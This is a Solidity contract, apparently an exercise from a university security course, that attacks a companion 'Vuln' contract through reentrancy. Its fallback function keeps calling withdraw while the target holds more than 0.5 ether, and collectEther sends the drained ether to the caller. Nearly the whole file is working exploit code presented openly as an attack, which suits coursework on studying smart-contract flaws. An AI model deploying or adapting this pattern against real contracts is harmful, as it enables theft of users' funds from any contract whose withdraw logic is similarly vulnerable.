pragma solidity ^0.6.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)
import "vuln.sol";

contract Attack {
  Vuln public vuln;

  // initialise the vuln variable with the contract address
  constructor(address _vulnAddress) public {
      vuln = Vuln(_vulnAddress);
  }

  function pwnVuln() public payable {
      require(msg.value >= .1 ether);
      vuln.deposit.value(.1 ether)();
      vuln.withdraw();
  }

  function collectEther() public {
      msg.sender.transfer(address(this).balance);
  }

  fallback() external payable {
      if (address(vuln).balance > .5 ether) {
          vuln.withdraw();
      }
  }
}